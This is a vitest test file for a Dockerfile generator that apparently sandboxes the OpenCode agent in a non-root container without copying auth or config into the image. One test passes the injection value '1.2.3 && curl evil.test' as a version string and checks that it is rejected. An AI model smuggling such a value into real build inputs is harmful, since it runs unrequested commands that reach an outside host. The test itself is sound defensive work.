import { describe, expect, test } from 'vitest';
import { generateDockerfile } from '../../src/docker/dockerfile.js';
import type { Profile } from '../../src/core/types.js';

const profile: Profile = {
  schemaVersion: '1',
  tool: 'opencode',
  imageName: 'codecapsule/opencode:latest',
  containerWorkdir: '/workspace',
  opencodeVersion: '0.9.1',
  stateVolume: 'codecapsule-opencode-state',
  cacheVolume: 'codecapsule-opencode-cache',
  network: 'bridge',
  imports: {
    settings: false,
    auth: false,
    skills: false,
    plugins: false,
    agents: false,
    commands: false,
    tools: false,
    themes: false
  },
  security: {
    allowPrivileged: false,
    allowDockerSocket: false,
    allowHostHomeMount: false,
    allowSshAgent: false,
    envAllowlist: []
  }
};

describe('generateDockerfile', () => {
  test('uses the required Debian Node base image', () => {
    expect(generateDockerfile(profile)).toContain('FROM node:22-bookworm-slim');
  });

  test('creates and switches to the non-root codecapsule user', () => {
    const dockerfile = generateDockerfile(profile);

    expect(dockerfile).toContain('ARG USER_ID=10001');
    expect(dockerfile).toContain('ARG GROUP_ID=10001');
    expect(dockerfile).toContain('groupadd -g ${GROUP_ID} codecapsule');
    expect(dockerfile).toContain('useradd -u ${USER_ID} -g ${GROUP_ID} -m -d /home/codecapsule -s /bin/bash codecapsule');
    expect(dockerfile).toContain('/home/codecapsule/.local/share/opencode');
    expect(dockerfile).toContain('/home/codecapsule/.cache/opencode');
    expect(dockerfile).toContain('chown -R codecapsule:codecapsule /home/codecapsule');
    expect(dockerfile).toContain('USER codecapsule');
  });

  test('sets a writable home and XDG paths for OpenCode and Bun', () => {
    const dockerfile = generateDockerfile(profile);

    expect(dockerfile).toContain('ENV HOME=/home/codecapsule');
    expect(dockerfile).toContain('XDG_CONFIG_HOME=/home/codecapsule/.config');
    expect(dockerfile).toContain('XDG_DATA_HOME=/home/codecapsule/.local/share');
    expect(dockerfile).toContain('XDG_CACHE_HOME=/home/codecapsule/.cache');
  });

  test('does not bake auth or config into the image with COPY instructions', () => {
    const dockerfile = generateDockerfile(profile);

    expect(dockerfile).not.toMatch(/^COPY\s+/im);
    expect(dockerfile).not.toMatch(/^ADD\s+/im);
    expect(dockerfile).not.toMatch(/COPY\s+.*(?:auth|config|opencode|\.config)/i);
  });

  test('uses the profile OpenCode version as the build arg default', () => {
    expect(generateDockerfile(profile)).toContain('ARG OPENCODE_VERSION=0.9.1');
    expect(generateDockerfile(profile)).toContain('npm install -g opencode-ai@${OPENCODE_VERSION}');
  });

  test('rejects invalid OpenCode versions before generating a Dockerfile', () => {
    expect(() => generateDockerfile({ ...profile, opencodeVersion: '1.2.3 && curl evil.test' })).toThrow(
      'Invalid opencodeVersion'
    );
  });

  test('sets tini as the entrypoint and opencode as the default command', () => {
    const dockerfile = generateDockerfile(profile);

    expect(dockerfile).toContain('ENTRYPOINT ["tini", "--"]');
    expect(dockerfile).toContain('CMD ["opencode"]');
  });
});
